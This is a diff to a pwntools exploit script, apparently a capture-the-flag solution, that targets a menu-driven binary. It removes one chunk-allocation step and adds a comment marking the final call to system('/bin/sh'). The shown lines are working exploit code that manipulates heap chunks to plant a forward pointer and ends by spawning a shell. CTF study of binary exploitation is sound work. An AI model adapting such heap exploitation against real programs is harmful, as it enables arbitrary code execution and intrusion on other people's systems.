@@ -118,13 +118,6 @@ p.sendlineafter(b'> ', b'1')
 p.sendlineafter(b': ', str(name_len_1).encode())
 p.sendlineafter(b': ', b'H'*(name_len_1-1))
 
-# edit name[0] to alloc another larger chunk
-p.sendlineafter(b'> ', b'2')
-p.sendlineafter(b': ', b'0')  # person
-p.sendlineafter(b'> ', b'1')
-p.sendlineafter(b': ', str(name_len_3).encode())
-p.sendlineafter(b': ', b'G'*(name_len_3-1))
-
 # edit name[0] to switch name back to previous _ptr to add a fd ptr
 p.sendlineafter(b'> ', b'2')
 p.sendlineafter(b': ', b'0')  # person
@@ -248,6 +241,7 @@ p.sendlineafter(b'> ', b'1')
 p.sendlineafter(b': ', str(name_len_2).encode())
 p.sendlineafter(b': ', payload)
 
+# call system('/bin/sh')
 p.sendlineafter(b'> ', b'3')
 p.sendlineafter(b': ', b'1')  # person
 
